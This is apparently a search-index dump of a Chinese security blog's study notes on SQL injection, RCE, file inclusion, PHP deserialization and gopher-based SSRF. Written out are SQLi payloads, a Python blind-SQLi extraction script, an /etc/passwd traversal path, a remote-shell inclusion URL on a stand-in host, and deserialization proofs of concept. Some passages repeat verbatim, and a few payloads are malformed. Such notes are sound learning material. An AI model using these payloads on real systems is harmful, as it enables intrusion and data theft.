[{"title":"SQL","url":"/2025/07/05/SQL/","content":"SQL简介：SQL注入是一种常见的网络安全攻击手段，攻击者通过在输入字段中插入恶意的SQL代码，从而操纵后端数据库查询。如果应用程序未对用户输入进行适当的验证和过滤，攻击者可以利用SQL注入获取、修改或删除数据库中的敏感数据，甚至控制整个数据库服务器。\nSQL注入的原理\n用户输入未经验证：应用程序直接将用户输入的数据拼接到SQL查询中。\n恶意SQL代码注入：攻击者在输入中插入SQL语句，改变原查询的逻辑。\n数据库执行恶意代码：数据库执行被篡改的查询，导致数据泄露或破坏。\n\n示例假设有一个登录表单，用户输入用户名和密码，后端SQL查询如下：\nsql\n复制\nSELECT * FROM users WHERE username = &#x27;user_input&#x27; AND password = &#x27;user_password&#x27;;\n\n如果用户输入 admin&#39; -- 作为用户名，查询变为：\nsql\n复制\nSELECT * FROM users WHERE username = &#x27;admin&#x27; --&#x27; AND password = &#x27;user_password&#x27;;\n\n-- 是SQL注释符，后续部分被忽略，攻击者可能无需密码即可登录。\n前置知识特殊数据库在MySQL 5.0版本之后，MySQL默认在数据库中存放一个information_schema的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。\n\nschemata表存储该用户创建的所有数据库的库名。\n&gt;&gt;&gt;&gt;其中记录数据库库名的字段名为：schema_name。\n\ntables表存储该用户创建的所有数据库的库名和表名。\n&gt;&gt;&gt;&gt;其中记录数据库库名和表名的字段名分别是：tables_schema和table_name。\n\ncolumns表存储该用户创建的所有数据库的库名、表名和字段名。\n&gt;&gt;&gt;&gt;其中记录数据库库名、表名和字段名的字段名分别是：tables_schema、table_name和column_name。\n\n\n注释符在MySQL中，常见注释符的表达方式：\n # …… ：#号后面的都会被注释\n -- …… ：--号后面的都会被注释，不过在 -- 的前后都需要加空格再加数据(GET传参时只能使用--，后的空格用+代替)\n / *... */ ：在查询语句中使用斜杠星号注释，从 &#x2F; 开始到 *&#x2F; 结束的部分都被视为注释，不会被执行。\n\n但**/* ... */** 的特殊用法--条件注释\n\n条件注释是一种特殊的注释语法，它允许在注释中使用关键字，而这些关键字在执行查询时会被解析为相应的操作。\n语法格式为：\nsql/*!&lt;conditional_keyword&gt; &lt;query_part&gt; */\n\n例如：index?id=-10 /*!union*/ /*!select*/ 1,2,3等同于index?id=-10 union select 1,2,3\nSQL注入常用基础语句sqlselect version(); #查看数据库版本 select user(); #查看数据库用户select database(); #查看当前库名;select table_name from information_schema.tables where table_schema=database() ; #查看当前库下的表名select group_concat(table_name) from information_schema.tables where table_schema=database() ; #只回显一行数据下查看当前库下的全部表名select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;xxx&#x27;; #查询列名-把xxx缓存前面查询到的表名\n\n**SQL注入常用函数与技巧联合查询1.concat()函数\n concat()函数：将多个不同字段的字符串连接成一个字符串。\nsqlconcat(str1，str2) #语法\n\n注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。\n2.group_concat()函数\n group_concat() 将多个同个字段的字符串连接成一个字符串。\nsqlgroup_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法\n\n**3.**order by函数用于判断表中实际包含的列数\nselect * from … order by 1(按照第一列进行升序排列)\nselect * from … order by 2\nselect * from … order by 3 …\n知道报错为止，这样可以知道具体有多少个列；（当然直接查询列名也可以）\n*4.group by语句：用于结合合计函数，根据一个或多个列队结果集进行分组。\n gourp by x：是会根据x的规则队数据进行分组，而分组的时候，MySQL会建立一个临时空表来进行分组。\n*5***substr()****函数：用来截取数据库某个字段中的一部分。\n语法：substr(string，start，length)\n参数：string：必选，数据库中需要截取的字段\n   start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。\n   length：可选，需要截取的长度。缺省。即截取到结束位置\n*6**ascii()函数：返回字符串str的最左边的数值。*\n语法：ascii(str)\n报错注入1.extractvalue()函数\n 从 MySQL 5.7.8 版本开始，ExtractValue() 函数已被弃用\n ExtractValue() 函数来提取 XML 字符串中的特定路径的值。\nplaintextExtractValue(xml_frag, xpath_expression)\n\n\nxml_frag：xml文档对象的名称，是一个string类型。\nxpath_expr：使用xpath语法格式的路径。\n\npayload:\nselect * from text where id&#x3D;1 and extractvalue(null,concat(0x7e,(select database()),0x7e))\n2.updataxml()函数\n\nxml_target：xml文档对象的名称，是一个string类型。\nxpath_expr：使用xpath语法格式的路径。\nnew_xml：需要更新的内容。\n\npayload实例：\n在这里需要触发错误获得数据显示，我们可以将xml_frag写为null或其他显然不符合xml格式的东西（比如数字）\n将xpath_expr写为不符合条件的查询式子，例如0x7e,(select database()),0x7e    \n tip:0x7e是~的一种16进制写法，在这里，sql语句不支持U+写法，比如U+007E，支持0x开头的16进制写法\n直接查阅资料得到~的16进制写法为7E，所以在这里写作0x7e\npayload：\nselect * from text where id&#x3D;1 and updatexml(null,concat(0x7e,(select database()),0x7e),null)\n时间盲注1.substr()/substring()函数\n substr()/substring()函数：用来截取数据库某个字段中的一部分。\nsqlsubstr(string，start开始位置，length截取长度)  #语法payload:?id=&#x27;&#x27; or substr(database(),1,1)=&#x27;s&#x27;#\n\n参数\n\nstring：必选，数据库中需要截取的字段\nstart：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始 截取；0，在字符串中第一个位置开始截取。\nlength：可选，需要截取的长度。缺省。即截取到结束位置\n\n2.ascii()函数(和substr函数功能类似)\n ascii()函数：返回字符串str的最左边的数值。\nsqlascii(str)  #语法payload:?id=&#x27;&#x27; or ascii(substr(database(),1,1))=&#x27;w&#x27;#或者select ascii(database())返回左边字符\n\n2.length() 函数，返回字符串的长度\nsqllength(str) #语法payload:?id=&#x27;&#x27; or length(database())&gt;3#\n\n时间盲注思路：在网页不显示任何有效信息的情况下（包括报错信息），采用sleep函数和if函数进行比对\n即–&gt;满足条件就陷入沉睡；\n用此语句判断数据库名字长度\npayload:select * from test where id=&#x27;&#x27; or if((length(database()))&gt;3,sleep(5),0)\n\nif语句：if（条件,正确时执行,错误时执行）(执行0时没什么鸟用)\n逐个判断数据库名字的每一个字符\npayload：select * from test where id=&#x27;&#x27; or if((substr(database(),1,1))=&#x27;w&#x27;,sleep(5),0)\n\n判断表(列)的个数\npayload：select * from test where id=&#x27;&#x27; or if((select count(*) from information_schema.tables where table_schema=&#x27;...&#x27;)&gt;3,sleep(5),0)\n\n判断第一个表的名称 \nlimit a,b：跳过第a条，查询b条\npayload：select * from test where id=&#x27;&#x27; or if((select substr(table_name) from information_schema.tables where table_schema=&#x27;...&#x27; limit 0,1)&gt;3,sleep(5),0)\n\n判断第一个列的名称\npayload：select * from test where id=&#x27;&#x27; or if((select substr(column_name) from information_schema.columns where table_schema=&#x27;...&#x27; and table_name=&#x27;...&#x27; limit 0,1)&gt;3,sleep(5),0)\n\n使用ai脚本进行计算：(输入框版)：（不建议把时间压得太短！！！）\nimport requestsimport stringimport time#配置目标 URL 和基础信息url = &quot;........&quot;username_template = &quot;&#x27; or if((select substr(value,&#123;index&#125;,1) from flag)=&#x27;&#123;char&#125;&#x27;,sleep(3),0)#&quot;#填写payloadpassword = &quot;0&quot;#用于测试的字符集（可以根据实际情况扩展）charset = string.ascii_letters + string.digits + &quot;&#123;&#125;_-&quot;def time_blind_injection():    extracted_value = &quot;&quot;    index = 1  # 从第1个字符开始    while True:        found = False        for char in charset:            payload = username_template.format(index=index, char=char)            start_time = time.time()                        # 发送 POST 请求            response = requests.post(url, data=&#123;&quot;username&quot;: payload, &quot;password&quot;: password&#125;)            elapsed_time = time.time() - start_time                        # 判断响应时间是否超过3秒            if elapsed_time &gt; 3:                extracted_value += char                print(f&quot;[+] Found character at position &#123;index&#125;: &#123;char&#125;&quot;)                found = True                break            if not found:  # 如果在当前索引没有找到字符，说明到达字符串末尾            print(&quot;[+] Extraction complete!&quot;)            break            index += 1        return extracted_valueif __name__ == &quot;__main__&quot;:    print(&quot;[*] Starting time-based blind SQL injection...&quot;)    result = time_blind_injection()    print(f&quot;[+] Extracted value: &#123;result&#125;&quot;)\n\n\n\n布尔盲注注入点分类①数字型注入点类似的后端语句\nphp$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);\n\n在 Web 端大概是 http://xxx.com/index.php?id=1 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。\n用1 and 1=1进行组合出来的sql注入语句为：\nplaintextselect * from news where id=1 and 1=1\n\n②字符型注入点类似的后端语句\nphp$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);\n\n在 Web 端大概是 http://xxx.com/index.php?id=admin 这种形式，其注入点id 类型为字符类型，所以叫字符型注入点。\n使用id=1&#39; and 1=1 --+组合出来的sql注入语句为：\nsqlselect * from news where id=&#x27;admin&#x27; and 1=1 --+&#x27; LIMIT 0,1&quot;;\n\n注意多了一个引号。由于注入拼接语句后多了一个&#39;,需要用注释符进行消除对语句的影响\n③搜索型注入点这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：\nsqlselect * from 表名 where 字段 like &#x27;%关键字%&#x27;`。组合出来的sql注入语句为：select * from news where search like &#x27;%测试 %&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;测试%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;\n\n判断注入点注意区别语句报错与页面报错、页面数据不正确的区别\n 1.?id=1 and 1=1 和?id=1 and 1=2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。\n 2.?id=1&#39; and 1=1 --+ / #和?id=1&#39; and 1=2 --+ / #或使用?id&#39; and &#39;1&#39;=&#39;1和?id&#39; and &#39;1&#39;=&#39;2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。\n 3.?id=1%&#39; and 1=1 --+ / #和?id=1%&#39; and 1=2 --+ / #进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。\n"},{"title":"rce","url":"/2025/07/05/rce-title/","content":"参考：渗透测试——命令执行漏洞（RCE）详解 - 知乎\n常见rce函数1.利用系统函数实现命令执行的函数：\neval（）、assert（）、preg_replace（）、call_user_func（） 、如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏 洞 其他函数\nob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、  array_filter（）、 array_reduce（）、 array_map（）\n2.直接执行系统命令的代码函数\nsystem（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（），  proc_open（），反引号\n常见rce方法文件上传漏洞上传文件（如一句话木马）\n\n\n上传到服务器后，通过访问该文件并对进行cmd传参（例如执行系统命令以查看服务器）进行rce。当然使用蚁剑直接看也是更方便的\n文件上传绕过漏洞前端绕过直接修改文件后缀为合适的文件，再进行抓包，修改为正常的php后缀以绕过前端检测\n后端MIME绕过MIME检测：检测请求包中的content-type头可在请求包中修改以绕过。\n文件包含什么是文件包含？当应用程序动态地包含外部文件（如脚本、配置文件或其他资源）时，如果未对用户输入进行严格的验证和过滤，攻击者可以通过构造恶意输入，使应用程序包含并执行非预期的文件，从而导致安全风险。\ntip：不需要是一定是php文件，只要含有代码即可被执行，甚至代码可以不需要放在上传的文件中，只要存放在可以被执行的地方即可。\n例如，文件限制只能上传图片，那其实可以在图片中插入php。反正能被执行就好了。\n包含函数在 PHP 中，include 和 require 是用于引入外部文件的两个常用函数。它们的作用是将指定文件的内容插入到当前脚本中，以便复用代码或加载依赖文件。\n1.include 函数\n\n作用：引入指定的文件。如果文件不存在或引入失败，PHP 会发出一个警告（E_WARNING），但脚本会继续执行。\n\n语法：\ninclude &#x27;filename.php&#x27;;\n\n特点：\n\n文件不存在时，脚本不会终止。\n适合引入非核心文件，如模板文件、可选配置文件等。\n\n\n示例：\ninclude &#x27;header.php&#x27;; // 引入 header.php 文件echo &quot;This is the main content.&quot;;include &#x27;footer.php&#x27;; // 引入 footer.php 文件\n\n\n\nrequire 函数\n\n\n作用：引入指定的文件。如果文件不存在或引入失败，PHP 会发出一个致命错误（E_COMPILE_ERROR），并终止脚本执行。\n\n语法：\nphp\n复制\nrequire &#x27;filename.php&#x27;;\n\n特点：\n\n文件不存在时，脚本会终止。\n适合引入核心文件，如类定义、函数库等。\n\n\n示例：\nphp\n复制\nrequire &#x27;config.php&#x27;; // 引入配置文件require &#x27;functions.php&#x27;; // 引入函数库echo &quot;Application started.&quot;;\n\n3.include_once 和 require_once\n\n作用：与 include 和 require 类似，但会检查文件是否已经被引入过。如果已经引入，则不会重复引入。\n\n语法：\ninclude_once &#x27;filename.php&#x27;;require_once &#x27;filename.php&#x27;;\n\n1. 本地文件包含（LFI）\n定义：攻击者通过利用应用程序的文件包含功能，包含并执行服务器本地的文件。\n\n危害：\n\n读取敏感文件（如/etc/passwd、配置文件、日志文件等）。\n执行恶意代码（如果文件内容可被解析，如PHP文件）。\n\n\n示例：\n\n假设一个PHP应用程序有以下代码：\n&lt;?php$file = $_GET[&#x27;file&#x27;];include($file . &#x27;.php&#x27;);?&gt;\n\n攻击者可以通过以下URL读取服务器上的敏感文件：\nhttp://example.com/index.php?file=../../../../etc/passwd\n\n\n\n\n\n日志包含服务器的访问日志在Apache中会被存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log中；在nginx中会被存在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log中具体存储中包含请求方法，URL，浏览器情况等。因此可以在日志中包含我们的php。\n例如，在user_agent头中修改，改为php木马，则访问&#x2F;var&#x2F;www&#x2F;…&#x2F;access.log头时就可以对php进行触发，达到rce的目的\n2. 远程文件包含（RFI）\n定义：攻击者通过利用应用程序的文件包含功能，包含并执行远程服务器上的文件。\n\n危害：\n\n执行远程恶意代码（如PHP Shell）。\n完全控制服务器。\n\n\n示例：\n\n假设一个PHP应用程序有以下代码：\n&lt;?php$file = $_GET[&#x27;file&#x27;];include($file);?&gt;\n\n攻击者可以通过以下URL包含并执行远程恶意脚本：\nhttp://example.com/index.php?file=http://malicious-site.com/shell.php\n\n如果服务器配置允许远程文件包含，攻击者可以直接在服务器上执行任意代码。\n\n\n\n\n"},{"title":"PHP反序列化","url":"/2025/07/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"PHP \nserialize() 函数serialize() 函数用于序列化对象或数组，并返回一个字符串。\nserialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。\n反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。\n$source = &quot;helloworld&quot;; echo serialize($source);\n\n在浏览器显示：s:10:“helloworld”\nunserialize()函数$source = &#x27;a:2:&#123;i:0;s:8:&quot;shandong&quot;;i:1;s:5:&quot;jinan&quot;;&#125;&#x27;;$array = unserialize($source);var_dump($array);\n\n\n浏览器以原数组的方式展现出来：array(2) { [0]&#x3D;&gt; string(8) “shandong” [1]&#x3D;&gt; string(5) “jinan” }\n魔术方法在PHP反序列化的过程中会自动执行一些魔术方法，完整列表如下：方法名调用条件___call调用不可访问或不存在的方法时被调用 __call($name, $args)__callStatic调用不可访问或不存在的静态方法时被调用___clone进行对象clone时被调用，用来调整对象的克隆行为_constuct构建对象的时被调用；__debuginfo当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本___destruct明确销毁对象或脚本结束时被调用；___get读取不可访问或不存在属性时被调用___invoke当以函数方式调用对象时被调用___isset对不可访问或不存在的属性调用isset()或empty()时被调用___set当给不可访问或不存在属性赋值时被调用___set_state当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。___sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用___toString当一个类被转换成字符串时被调用___unset对不可访问或不存在的属性进行unset时被调用___wakeup当使用unserialize时被调用，可用于做些对象的初始化操作\n反序列化漏洞存在反序列化漏洞的代码新建一个PHP源文件，命名为：usdemo.php2、如何利用该反序列化漏洞（1）先分析代码的结构，值如何传入，什么情况下会被调用，被调用后是什么结果（2）由于反序列化后输出结果通常是比较复杂的结构，人为构造是很容易出错且几乎不可能的事情，所以我们需要自己编写一个与漏洞代码相同的类名，相同的属性，甚至相同代码的类，用于生成序列化后的字符串新建一个PHP源文件，命令为uspoc.php&#x2F;&#x2F; 构造漏洞利用的POC，并输出反序列化后的结果\n￼class Test &#123;    public $phone = &#x27;&#x27;;    var $ip = &#x27;&#x27;;&#125;$t = new Test();$t-&gt;phone = &#x27;phpinfo();&#x27;;$t-&gt;ip = &#x27;127.0.0.2&#x27;;echo serialize($t);\n\n\n2、如何利用该反序列化漏洞（1）先分析代码的结构，值如何传入，什么情况下会被调用，被调用后是什么结果（2）由于反序列化后输出结果通常是比较复杂的结构，人为构造是很容易出错且几乎不可能的事情，所以我们需要自己编写一个与漏洞代码相同的类名，相同的属性，甚至相同代码的类，用于生成序列化后的字符串新建一个PHP源文件，命令为uspoc.php&#x2F;&#x2F; 构造漏洞利用的POC，并输出反序列化后的结果\n（3）从下图POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\nclass USDemo &#123;    var $code = &#x27;phpinfo();&#x27;;   // 直接填充要执行的命令体    function __destruct() &#123;        @eval($this-&gt;code);    &#125;&#125;$utp = new USDemo();echo serialize($utp);   // 输出为：O:6:&quot;USDemo&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n\n\n（3）从上述POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\n（3）从上述POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\nclass USDemo &#123;    var $code = &#x27;phpinfo();&#x27;;   // 直接填充要执行的命令体    function __destruct() &#123;        @eval($this-&gt;code);    &#125;&#125;$utp = new USDemo();echo serialize($utp);   // 输出为：O:6:&quot;USDemo&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n（3）从上述POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\nPHP反序列化基础利用链漏洞代码class kaiser &#123;    var $a;    function __construct() &#123;        $this-&gt;a = new Test();    &#125;    function __destruct() &#123;        $this-&gt;a-&gt;hello();    &#125;&#125;class Test &#123;    function hello() &#123;        echo &quot;Hello World.&quot;;    &#125;&#125;class Vul &#123;    var $data;    function hello() &#123;        @eval($this-&gt;data);    &#125;&#125;unserialize($_GET[&#x27;code&#x27;]);\n\npocclass kaiser &#123;    var $a;    function __construct() &#123;        $this-&gt;a = new Vul();    &#125;    function __destruct() &#123;        $this-&gt;a-&gt;hello();    &#125;&#125;class Vul &#123;    var $data= &quot;phpinfo();&quot;;    function hello() &#123;        @eval($this-&gt;data);    &#125;    // function __call($name, $args) &#123;    //     $this-&gt;hi();    // &#125;&#125;echo serialize(new kaiser());\n\n简化的pocclass kaiser &#123;    var $a;    function __construct() &#123;        $this-&gt;a = new Vul();    &#125;&#125;class Vul &#123;    // protected $data = &quot;phpinfo();&quot;;    protected $data = &quot;system(&#x27;ifconfig&#x27;);&quot;;&#125;echo urlencode(serialize(new kaiser()));\n\n\n\n反序列化的常用手段1、反序列化的常见起点：（1）__wakeup 一定会调用\n（2）__destruct 一定会调用\n（3）__toString 当一个对象被反序列化后又被当做字符串使用\n2、反序列化的常见中间跳板:（1）__toString 当一个对象被当做字符串使用\n（2）__get 读取不可访问或不存在属性时被调用\n（3）__set 当给不可访问或不存在属性赋值时被调用\n（4）__isset 对不可访问或不存在的属性调用isset()或empty()时被调用，形如 this−&gt;this-&gt;this−&gt;func();\n（5）__call 调用不可访问或不存在的方法时被调用\n3、反序列化的常见终点:（1）call_user_func 一般php代码执行都会选择这里\n（2）call_user_func_array 一般php代码执行都会选择这里\n（3）执行指令、文件操作、执行代码等敏感操作\n"},{"title":"ssrf","url":"/2025/07/22/ssrf/","content":"什么是SSRF漏洞？以及相关SSRF知识：https://cloud.tencent.com/developer/article/2103240\ngopher协议Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；\n发送get请求直接发送一个get请求包，然后根据需要转变为gopher形式\n举例：\nGET &#x2F;ssrf&#x2F;base&#x2F;get.php?name&#x3D;114514 HTTP&#x2F;1.1Host: 192.168.0.109\n经过多次URL编码后变为：（服务器自身会解码）\nGET%20%2Fssrf%2Fbase%2Fget.php%3Fname%3D114514%20HTTP%2F1.1%0AHost%3A%20192.168.0.109\n改写为：\ncurl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20%2Fssrf%2Fbase%2Fget.php%3Fname%3D114514%20HTTP%2F1.1%0AHost%3A%20192.168.0.109%0d%0A\n请注意：\n\n问号（？）需要转码为URL编码，也就是%3f\n回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a\n在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）\n\n在这里curl用于在cmd执行gopher，在powershell改为Invoke-WebRequest。\n发送post请求注意这四个字段必不可少！\nPOST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1\nHost: 192.168.0.109\nContent-Type: application&#x2F;x-www-form-urlencoded\nContent-Length: 11\n name&#x3D;114514\n转变为\ncurl\ngopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_POST%20%2Fssrf%2Fbase%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A%20192.168.0.109%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2011%0D%0A%0D%0Aname%3D114514%0D%0A\n随后在命令行进行执行即可\n如果要跟踪302跳转，只需curl -L即可\n"},{"title":"文件包含","url":"/2025/07/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"参考：文件包含漏洞全面详解-CSDN博客\n"}]